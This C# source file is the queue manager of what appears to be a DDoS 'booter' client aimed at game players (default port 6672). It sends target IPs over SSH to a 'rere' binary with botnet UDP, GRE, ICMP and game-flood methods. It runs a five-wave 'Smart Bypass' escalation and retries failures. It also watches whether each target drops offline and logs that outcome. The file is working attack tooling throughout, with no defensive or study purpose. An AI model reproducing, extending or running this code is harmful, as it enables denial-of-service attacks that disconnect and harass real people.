using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Rere.Models;

namespace Rere.Managers
{
    // ─── TRX Manager ────────────────────────────────────────────────────────────
    public class TRXManager
    {
        public static readonly TRXManager Shared = new TRXManager();

        private readonly List<TRXEntry> _queue = new();
        private bool _isRunning;
        private string? _currentIP;
        private int _countdown;
        private Timer? _countdownTimer;
        private readonly Dictionary<string, DateTime> _watchList = new();
        private string? _activeIP;
        private int _activeCountdown;
        private Timer? _activeTimer;
        private bool _bypassCancelled;

        private readonly List<TRXLogEntry> _trxLog = new();

        public Action<List<TRXEntry>, string?, int, string?, int, List<TRXLogEntry>>? OnQueueUpdate;
        public Action<string, ToastType>? OnToast;

        private TRXManager() { }

        // ─── Queue Management ────────────────────────────────────────────────────

        public void AddToQueue(string ip, string port, string name,
            string? method = null, int? customDuration = null, TRXMode mode = TRXMode.Normal)
        {
            if (_queue.Any(e => e.Ip == ip) || _currentIP == ip)
            {
                OnToast?.Invoke("⚠️ موجود بالطابور", ToastType.Warning);
                return;
            }

            var entry = new TRXEntry
            {
                Ip             = ip,
                Port           = string.IsNullOrEmpty(port) ? "6672" : port,
                Name           = string.IsNullOrEmpty(name) ? ip : name,
                AddedAt        = DateTime.Now,
                Status         = TRXEntry.TRXStatus.Pending,
                Method         = method,
                CustomDuration = customDuration,
                Mode           = mode
            };

            _queue.Add(entry);
            UpdateQueue();
            if (!_isRunning) ProcessQueue();
        }

        public void RemoveFromQueue(string ip)
        {
            if (_currentIP == ip) _bypassCancelled = true;
            _queue.RemoveAll(e => e.Ip == ip);
            UpdateQueue();
        }

        public void RemoveFromQueue(int index)
        {
            if (index < 0 || index >= _queue.Count) return;
            _queue.RemoveAt(index);
            UpdateQueue();
        }

        public void CheckQueueOnExit(string ip)
        {
            var idx = _queue.FindIndex(e => e.Ip == ip);
            if (idx > 0)
            {
                _queue.RemoveAt(idx);
                OnToast?.Invoke($"⏭ غادر وأُسقط من الطابور: {ip}", ToastType.Warning);
                UpdateQueue();
            }
        }

        public void ClearQueue()
        {
            _bypassCancelled = true;
            _queue.Clear();
            UpdateQueue();
        }

        public void CancelCurrent()
        {
            if (_currentIP == null) return;
            _bypassCancelled = true;
            if (_queue.Count > 0) _queue.RemoveAt(0);
            _isRunning  = false;
            _currentIP  = null;
            _countdown  = 0;
            _countdownTimer?.Dispose();
            _countdownTimer = null;
            StopActiveCountdown();
            UpdateQueue();
            OnToast?.Invoke("🚫 تم إلغاء TRX الحالي", ToastType.Warning);
            if (_queue.Count > 0) ProcessQueue();
        }

        // ─── Queue Processing ────────────────────────────────────────────────────

        private void ProcessQueue()
        {
            if (_queue.Count == 0)
            {
                _isRunning = false;
                _currentIP = null;
                _countdown = 0;
                UpdateQueue();
                return;
            }

            _isRunning       = true;
            _currentIP       = _queue[0].Ip;
            _bypassCancelled = false;

            _queue[0].Status = TRXEntry.TRXStatus.Sending;
            UpdateQueue();

            var entry = _queue[0];
            if (entry.Mode == TRXMode.Bypass)
                _ = SendBypassAsync(entry);
            else
                _ = SendTRXAsync(entry);
        }

        // ─── Smart Bypass (5 موجات) ──────────────────────────────────────────────

        private async Task SendBypassAsync(TRXEntry entry)
        {
            var settings = ConfigManager.Shared.LoadSettings();
            var waveDuration = entry.CustomDuration ?? settings.RereDuration;

            var waveMethods = new[] { "IPRAND", "BOTNET-UDP PPS", "BOTNET-GRE", "BOTNET-GAME", "BOTNET-ICMP" };
            var waveLabels  = new[] { "IP Confusion", "UDP Pressure", "Protocol Bypass", "Kill Shot", "ICMP Flood" };

            var wavesSent  = 0;
            var droppedEarly = false;

            for (var i = 0; i < waveMethods.Length; i++)
            {
                if (_bypassCancelled) break;

                if (_watchList.ContainsKey(entry.Ip)) { droppedEarly = true; break; }

                var waveNum = i + 1;
                var method  = waveMethods[i];

                App.Current.Dispatcher.Invoke(() =>
                {
                    var idx = _queue.FindIndex(e => e.Ip == entry.Ip);
                    if (idx >= 0)
                    {
                        _queue[idx].BypassCurrentWave  = waveNum;
                        _queue[idx].BypassTotalWaves   = waveMethods.Length;
                        _queue[idx].BypassWaveMethod   = method;
                    }
                    UpdateQueue();
                });

                OnToast?.Invoke($"⚡ Wave {waveNum}/{waveMethods.Length} — {waveLabels[i]}", ToastType.Info);

                var cmd    = $"/usr/local/bin/rere 3 {entry.Ip} {entry.Port} {waveDuration} {method}";
                var result = "";
                try { result = await SSHManager.Shared.ExecuteImmediateAsync(cmd); } catch { }

                var sent = result.ToLower().Contains("success") || result.ToLower().Contains("attack sent");

                if (sent)
                {
                    wavesSent++;
                    OnToast?.Invoke($"✓ Wave {waveNum} أُرسلت — {method}", ToastType.Success);

                    App.Current.Dispatcher.Invoke(() =>
                    {
                        _activeIP        = entry.Ip;
                        _activeCountdown = waveDuration;
                        UpdateQueue();
                    });

                    for (var sec = waveDuration - 1; sec >= 0; sec--)
                    {
                        if (_bypassCancelled) break;

                        App.Current.Dispatcher.Invoke(() =>
                        {
                            _activeCountdown = sec;
                            UpdateQueue();
                        });

                        if (_watchList.ContainsKey(entry.Ip))
                        {
                            droppedEarly = true;
                            OnToast?.Invoke($"🎯 طاح خلال Wave {waveNum}! 🎯", ToastType.Success);
                            break;
                        }

                        await Task.Delay(1000);
                    }

                    if (droppedEarly || _bypassCancelled) break;

                    App.Current.Dispatcher.Invoke(() =>
                    {
                        _activeIP        = null;
                        _activeCountdown = 0;
                        UpdateQueue();
                    });

                    // 3s delay between waves
                    if (i < waveMethods.Length - 1 && !_bypassCancelled)
                    {
                        for (var s = 3; s >= 1; s--)
                        {
                            if (_bypassCancelled) break;
                            App.Current.Dispatcher.Invoke(() => { _countdown = s; UpdateQueue(); });
                            await Task.Delay(1000);
                        }
                        App.Current.Dispatcher.Invoke(() => { _countdown = 0; UpdateQueue(); });
                    }
                }
                else if (result.ToLower().Contains("limit"))
                {
                    OnToast?.Invoke($"⚠️ API Limit Wave {waveNum} — انتظار 5s", ToastType.Warning);
                    await Task.Delay(5000);
                }
                else
                {
                    OnToast?.Invoke($"✗ Wave {waveNum} مرفوضة — تخطي", ToastType.Error);
                }
            }

            // ── Bypass finished ──────────────────────────────────────────────────
            App.Current.Dispatcher.Invoke(() =>
            {
                _activeIP        = null;
                _activeCountdown = 0;
                _countdown       = 0;

                var dropped = droppedEarly || _watchList.ContainsKey(entry.Ip);

                var logEntry = new TRXLogEntry
                {
                    Ip          = entry.Ip,
                    Name        = entry.Name,
                    SentAt      = DateTime.Now,
                    Duration    = waveDuration,
                    Method      = "Smart Bypass",
                    Result      = wavesSent > 0 ? TRXLogEntry.TRXResult.Success : TRXLogEntry.TRXResult.Failed,
                    Verdict     = dropped ? TRXLogEntry.TRXVerdict.Exited : TRXLogEntry.TRXVerdict.Pending,
                    IsBypass    = true,
                    BypassWaves = wavesSent
                };

                _trxLog.Insert(0, logEntry);
                if (_trxLog.Count > 50) _trxLog.RemoveAt(_trxLog.Count - 1);

                if (!dropped && wavesSent > 0)
                {
                    _watchList[entry.Ip] = DateTime.Now;
                    var logId = logEntry.Id;
                    _ = Task.Delay(settings.ExitAlert * 1000).ContinueWith(_ =>
                        App.Current.Dispatcher.Invoke(() => FinalizeVerdict(logId, entry.Ip)));
                }

                var msg = wavesSent > 0
                    ? $"✅ Bypass — {wavesSent} موجات{(dropped ? " — طاح! 🎯" : " — يراقب...")}"
                    : "✗ Bypass فشل كلياً";

                OnToast?.Invoke(msg, dropped ? ToastType.Success : (wavesSent > 0 ? ToastType.Info : ToastType.Error));

                _queue.RemoveAll(e => e.Ip == entry.Ip);
                _currentIP = null;

                StartCountdown(settings.QueueDelay, () =>
                {
                    App.Current.Dispatcher.Invoke(ProcessQueue);
                });
                UpdateQueue();
            });
        }

        // ─── Normal / Manual TRX ─────────────────────────────────────────────────

        private async Task SendTRXAsync(TRXEntry entry)
        {
            var settings = ConfigManager.Shared.LoadSettings();
            var duration = entry.CustomDuration ?? settings.RereDuration;

            var command = (entry.Method != null && entry.Mode == TRXMode.Manual)
                ? $"/usr/local/bin/rere 3 {entry.Ip} {entry.Port} {duration} {entry.Method}"
                : $"/usr/local/bin/rere 1 {entry.Ip} {entry.Port} {duration}";

            try
            {
                var result  = await SSHManager.Shared.ExecuteImmediateAsync(command);
                var success = result.ToLower().Contains("success") || result.ToLower().Contains("attack sent");

                App.Current.Dispatcher.Invoke(() =>
                {
                    if (success)
                    {
                        OnToast?.Invoke($"✓ TRX نجح: {entry.Ip}", ToastType.Success);
                        _watchList[entry.Ip] = DateTime.Now;

                        var logEntry = new TRXLogEntry
                        {
                            Ip       = entry.Ip,
                            Name     = entry.Name,
                            SentAt   = DateTime.Now,
                            Duration = duration,
                            Method   = entry.Method ?? "BOTNET-GAME",
                            Result   = TRXLogEntry.TRXResult.Success,
                            Verdict  = TRXLogEntry.TRXVerdict.Pending
                        };

                        _trxLog.Insert(0, logEntry);
                        if (_trxLog.Count > 50) _trxLog.RemoveAt(_trxLog.Count - 1);

                        var logId = logEntry.Id;
                        _ = Task.Delay(settings.ExitAlert * 1000).ContinueWith(_ =>
                            App.Current.Dispatcher.Invoke(() => FinalizeVerdict(logId, entry.Ip)));

                        StartActiveCountdown(entry.Ip, duration);
                        if (_queue.Count > 0) _queue.RemoveAt(0);
                        _currentIP = null;

                        StartCountdown(settings.QueueDelay, () =>
                        {
                            App.Current.Dispatcher.Invoke(() =>
                            {
                                StopActiveCountdown();
                                ProcessQueue();
                            });
                        });
                    }
                    else
                    {
                        OnToast?.Invoke($"✗ فشل — إعادة بعد {settings.RetryDelay}s: {entry.Ip}", ToastType.Error);

                        var logEntry = new TRXLogEntry
                        {
                            Ip       = entry.Ip,
                            Name     = entry.Name,
                            SentAt   = DateTime.Now,
                            Duration = duration,
                            Method   = entry.Method ?? "BOTNET-GAME",
                            Result   = TRXLogEntry.TRXResult.Failed,
                            Verdict  = TRXLogEntry.TRXVerdict.Stayed
                        };
                        _trxLog.Insert(0, logEntry);
                        if (_trxLog.Count > 50) _trxLog.RemoveAt(_trxLog.Count - 1);

                        StartCountdown(settings.RetryDelay, () =>
                            _ = SendTRXAsync(entry));
                    }
                    UpdateQueue();
                });
            }
            catch (Exception)
            {
                App.Current.Dispatcher.Invoke(() =>
                {
                    OnToast?.Invoke($"✗ خطأ — إعادة بعد {settings.RetryDelay}s", ToastType.Error);
                    StartCountdown(settings.RetryDelay, () => _ = SendTRXAsync(entry));
                    UpdateQueue();
                });
            }
        }

        // ─── Active Countdown ────────────────────────────────────────────────────

        private void StartActiveCountdown(string ip, int seconds)
        {
            _activeTimer?.Dispose();
            _activeIP        = ip;
            _activeCountdown = seconds;
            UpdateQueue();

            _activeTimer = new Timer(_ =>
            {
                App.Current.Dispatcher.Invoke(() =>
                {
                    _activeCountdown--;
                    UpdateQueue();
                    if (_activeCountdown <= 0)
                    {
                        _activeTimer?.Dispose();
                        _activeTimer = null;
                    }
                });
            }, null, 1000, 1000);
        }

        private void StopActiveCountdown()
        {
            _activeTimer?.Dispose();
            _activeTimer     = null;
            _activeIP        = null;
            _activeCountdown = 0;
            UpdateQueue();
        }

        // ─── Verdict ─────────────────────────────────────────────────────────────

        private void FinalizeVerdict(Guid id, string ip)
        {
            var entry = _trxLog.FirstOrDefault(e => e.Id == id);
            if (entry == null) return;

            var exited = !_watchList.ContainsKey(ip);
            entry.Verdict = exited ? TRXLogEntry.TRXVerdict.Exited : TRXLogEntry.TRXVerdict.Stayed;
            UpdateQueue();
        }

        // ─── Countdown ───────────────────────────────────────────────────────────

        private void StartCountdown(int seconds, Action completion)
        {
            _countdown = seconds;
            UpdateQueue();
            _countdownTimer?.Dispose();

            _countdownTimer = new Timer(_ =>
            {
                App.Current.Dispatcher.Invoke(() =>
                {
                    _countdown--;
                    UpdateQueue();
                    if (_countdown <= 0)
                    {
                        _countdownTimer?.Dispose();
                        completion();
                    }
                });
            }, null, 1000, 1000);
        }

        // ─── Watch List ──────────────────────────────────────────────────────────

        public bool CheckExitAlert(string ip)
        {
            if (!_watchList.TryGetValue(ip, out var trxTime)) return false;

            var settings = ConfigManager.Shared.LoadSettings();
            var elapsed  = (DateTime.Now - trxTime).TotalSeconds;

            if (elapsed < settings.ExitAlert)
            {
                _watchList.Remove(ip);
                var entry = _trxLog.FirstOrDefault(e => e.Ip == ip && e.Verdict == TRXLogEntry.TRXVerdict.Pending);
                if (entry != null) { entry.Verdict = TRXLogEntry.TRXVerdict.Exited; UpdateQueue(); }
                return true;
            }
            return false;
        }

        // ─── Updates ─────────────────────────────────────────────────────────────

        private void UpdateQueue()
        {
            App.Current?.Dispatcher.BeginInvoke(() =>
                OnQueueUpdate?.Invoke(
                    _queue.ToList(), _currentIP, _countdown,
                    _activeIP, _activeCountdown, _trxLog.ToList()));
        }

        // ─── Getters ─────────────────────────────────────────────────────────────

        public List<TRXEntry> GetQueue()        => _queue.ToList();
        public string?        GetCurrentIP()    => _currentIP;
        public int            GetCountdown()    => _countdown;
        public string?        GetActiveIP()     => _activeIP;
        public int            GetActiveCountdown() => _activeCountdown;
        public int            GetTotalCount()   => _queue.Count + (_currentIP != null ? 1 : 0);
    }
}
